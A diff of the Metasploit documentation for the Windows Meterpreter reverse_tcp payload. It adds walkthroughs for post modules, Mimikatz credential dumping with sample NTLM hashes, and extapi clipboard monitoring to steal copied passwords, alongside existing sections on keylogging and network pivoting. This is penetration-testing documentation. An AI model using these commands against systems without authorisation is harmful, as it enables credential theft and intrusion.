@@ -9,12 +9,16 @@ windows/meterpreter/reverse_tcp is also the default payload for all Windows expl
 
 ## Vulnerable Application
 
-This meterpreter payload is suitable for the following environments:
+---
+
+This Meterpreter payload is suitable for the following environments:
 
 * Windows x64
 * Windows x86
 
 ## Verification Steps
+
+---
 
 windows/meterpreter/reverse_tcp is typically used in two different ways.
 
@@ -38,6 +42,8 @@ as an executable:
 ```
 
 ## Important Basic Commands
+
+---
 
 **pwd command**
 
@@ -179,7 +185,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Users\user\Desktop>
 ```
 
-To switch back to meterpreter, do [CTRL]+[Z] to background the channel.
+To switch back to Meterpreter, do [CTRL]+[Z] to background the channel.
 
 **sysinfo command**
 
@@ -199,7 +205,7 @@ meterpreter >
 
 **keyscan_start**
 
-The ```keyscan_start`` command starts the keylogging feature on the remote machine.
+The ```keyscan_start``` command starts the keylogging feature on the remote machine.
 
 **keyscan_dump**
 
@@ -275,6 +281,8 @@ SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:e09fcdea29d93203c925b2056
 
 ## Scenarios
 
+---
+
 **Setting up for Testing**
 
 For testing purposes, if you're tired of manually generating a payload and starting a multi handler
@@ -306,24 +314,161 @@ msf exploit(handler) >
 Next, go to your ~/.msf4/local directory, you should see meterpreter_reverse_tcp.exe in there.
 Upload that payload to your test box, execute it, and you should receive a connection.
 
+**Using a Post Module**
 
-**Antivirus Evasion**
+One of the best things about using Meterpreter is you have access to a variety of post exploitation
+modules, specifically the multi and Windows categories. Post modules provide more abilities to
+control of collect data from the remote machine automatically. For example: stealing passwords
+from popular applications, enumerate or modify system settings, etc.
 
-..
+To use a post module from the Meterpreter prompt. Simply use the ```run``` command, like so:
+
+```
+meterpreter > run post/windows/gather/checkvm 
+
+[*] Checking if WIN-6NH0Q8CJQVM is a Virtual Machine .....
+[*] This is a VMware Virtual Machine
+meterpreter >
+```
+
+It is also possible to run a post module via multiple Meterpreter sessions. To learn how, load
+the specific post module you wish to run, and enter ```info -d``` to see the basic usage in the
+documentation.
+
 
 **Using the Mimikatz Extension**
 
-..
+[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from
+memory on Windows. This might actually be the first thing you want to use as soon as you get a
+high-privileged session (such as SYSTEM).
+
+To begin, load the extension:
+
+```
+meterpreter > load mimikatz
+Loading extension mimikatz...success.
+meterpreter > 
+```
+
+This will create more commands for the Meterpreter prompt, most of them are meant to be used to
+retrieve user names/hashes/passwords and other information:
+
+```
+Mimikatz Commands
+=================
+
+    Command           Description
+    -------           -----------
+    kerberos          Attempt to retrieve kerberos creds
+    livessp           Attempt to retrieve livessp creds
+    mimikatz_command  Run a custom command
+    msv               Attempt to retrieve msv creds (hashes)
+    ssp               Attempt to retrieve ssp creds
+    tspkg             Attempt to retrieve tspkg creds
+    wdigest           Attempt to retrieve wdigest creds
+```
+
+An example of using ```msv```:
+
+```
+meterpreter > msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+AuthID    Package    Domain           User              Password
+------    -------    ------           ----              --------
+0;313876  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
+0;313828  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
+0;996     Negotiate  WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
+0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
+0;45518   NTLM                                          n.s. (Credentials KO)
+0;999     NTLM       WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
+```
+
 
 **Using the extapi Extension**
 
-..
+The main purpose of the extapi extension is for advanced enumeration of the target machine. For
+example: registered services, open windows, clipboard, ADSI, WMI queries, etc.
+
+To begin, at the Meterpreter prompt, do:
+
+```
+meterpreter > load extapi
+Loading extension extapi...success.
+meterpreter > 
+```
+
+One great feature of the extension is clipboard management. The Windows clipboard is interesting,
+because it can store anything sensitive: files, user names, passwords, etc, but not well protected.
+
+For example: A password manager is a popular tool to store passwords encrypted. It allows the user
+to create complex passwords without the need to memorize any of them. All the user needs to do is
+open the password manager, retrieve the password for a particular account by copying it, and then
+paste it on a login page.
+
+There is a security problem to the above process. When the user copies the password, it is stored
+in the operating system's clipboard. As an attacker, you can take advantage of this by starting the
+clipboard monitor from Meterpreter/extapi, and then collect whatever the user copies.
+
+To read whatever is currently stored in the target's clipboard, you can use the clipboard_get_data
+commnad:
+
+```
+meterpreter > clipboard_get_data
+Text captured at 2016-03-05 19:13:39.0170
+=========================================
+hello, world!!
+=========================================
+
+meterpreter > 
+```
+
+The limitation of this command is that since you're only grabbing whatever is in the clipboard at
+the time, there is only one item to collect. However, when you start a monitor, you can collect
+whatever goes in there. To start, issue the following command:
+
+```
+meterpreter > clipboard_monitor_start
+[+] Clipboard monitor started
+meterpreter > 
+```
+
+While it is monitoring, you can ask Meterpreter to dump whatever's been captured.
+
+```
+meterpreter > clipboard_monitor_dump
+Text captured at 2016-03-05 19:18:18.0466
+=========================================
+this is fun.
+=========================================
+
+Files captured at 2016-03-05 19:20:07.0525
+==========================================
+Remote Path : C:\Users\user\Desktop\cat_pic.png
+File size   : 37627 bytes
+downloading : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png
+download    : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png
+
+==========================================
+
+[+] Clipboard monitor dumped
+meterpreter > 
+```
+
+The ```clipboard_monitor_stop``` command will also dump the captured data, and then exit.
+
+Combined with Meterpreter's keylogger, you have a very effective setup to capture the user's
+inputs.
+
 
 **Using the Python Extension**
 
 The Python extension allows you to use the remote machine's Python interpreter.
 
-To load the extension, at the meterpreter prompt, do:
+To load the extension, at the Meterpreter prompt, do:
 
 ```
 meterpreter > use python
@@ -370,7 +515,7 @@ To learn more about the Python extension, please read this [wiki](https://github
 **Network Pivoting**
 
 There are three mains ways that you can use for moving around inside a network: the route command
-in the msf prompt, in the meterpreter prompt, and portfwd.
+in the msf prompt, in the Meterpreter prompt, and portfwd.
 
 The route command from the msf prompt allows you connect to hosts on a different network through
 the compromised machine. You should be able to determine that by looking at the compromised
@@ -410,7 +555,7 @@ IPv4 Netmask : 255.255.255.255
 ...
 ```
 
-The above shows that we have a meterpreter connection to 192.168.1.201 - let's call this box A.
+The above shows that we have a Meterpreter connection to 192.168.1.201 - let's call this box A.
 And then box A is connected to the 192.100.0.0/24 VPN network. We as an attacker aren't connected
 to this network directly, but we can explore that network through box A. So here's what we do by
 routing:
@@ -440,7 +585,7 @@ Another neat trick using route is that you can also bypass the compromised host'
 way. For example, if the host has HTTP open, but SMB blocked by the firewall. You can try to
 compromise it via HTTP first, use the route command to talk to SMB, and then try to exploit SMB.
 
-The route command in meterpreter allows you change the routing table that is on the target machine.
+The route command in Meterpreter allows you change the routing table that is on the target machine.
 The way it needs to be configured is similar to the route command in msf.
 
 The portfwd command allows you to talk to a remote service like it's local. For example, if you
@@ -459,7 +604,7 @@ rdesktop 127.0.0.1
 
 **Meterpreter Paranoid Mode**
 
-The paranoid mode forces the handler to be strict about which meterpreter should be connecting to
+The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to
 it, hence the name "paranoid mode".
 
 To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode).
@@ -477,19 +622,19 @@ To learn more about this feature, please [click here](https://github.com/rapid7/
 The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to
 avoid suspicious active communication, also better efficiency.
 
-It is very simple to use. At the meterpreter prompt, simply do:
+It is very simple to use. At the Meterpreter prompt, simply do:
 
 ```
 meterpreter > sleep 20
 ```
 
-And that will allow meterpreter to sleep 20 seconds, and will reconnect.
+And that will allow Meterpreter to sleep 20 seconds, and will reconnect.
 
 To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control).
 
 **Meterpreter Stageless Mode**
 
-A stageless meterpreter allows a more economical way to deliver the payload, for cases where a
+A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a
 normal one would actually cost too much time and bandwidth in a penetration test. To learn more
 about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode) to read more.
 
@@ -497,7 +642,7 @@ To use the stageless payload, use ```windows/meterpreter_reverse_tcp``` instead.
 
 **Meterpreter Timeout Control**
 
-The timeout control basically defines the life span of meterpreter. To configure, use the
+The timeout control basically defines the life span of Meterpreter. To configure, use the
 ```set_timeouts``` command:
 
 ```
@@ -530,11 +675,17 @@ To learn more about timeout control, please [click here](https://github.com/rapi
 
 **Meterpreter Transport Control**
 
-https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control
+Transport Control allows you manage transports on the fly while the payload session is still
+running. Meterpreter can automatically cycle through the transports when communication fails,
+or you can do so manually.
+
+To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).
 
 ## Using the Post Exploitation API in IRB
 
-To enter IRB, at the meterpreter prompt, do like the following:
+---
+
+To enter IRB, at the Meterpreter prompt, do like the following:
 
 ```
 meterpreter > irb
@@ -546,7 +697,7 @@ meterpreter > irb
 
 **The client object**
 
-The client object in meterpreter's IRB allows you control, or retrieve information about the host.
+The client object in Meterpreter's IRB allows you control, or retrieve information about the host.
 For example, this demonstrates how to obtain the current privilege we're running the payload as:
 
 ```ruby
